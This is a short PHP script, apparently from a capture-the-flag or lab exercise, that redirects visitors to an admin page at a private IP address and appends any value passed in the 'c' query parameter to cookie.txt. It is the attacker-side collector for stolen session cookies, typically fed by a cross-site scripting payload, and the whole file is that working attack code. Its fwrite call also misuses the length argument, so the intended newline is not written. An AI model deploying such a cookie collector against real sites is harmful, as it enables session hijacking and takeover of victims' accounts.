<?php
    header('Location: http://10.10.225.14/admin');

    if (isset($_GET["c"])) {
        $cookie = $_GET["c"];
        $file = fopen('cookie.txt', 'a');
        fwrite($file, $cookie, "\n");
    }
?>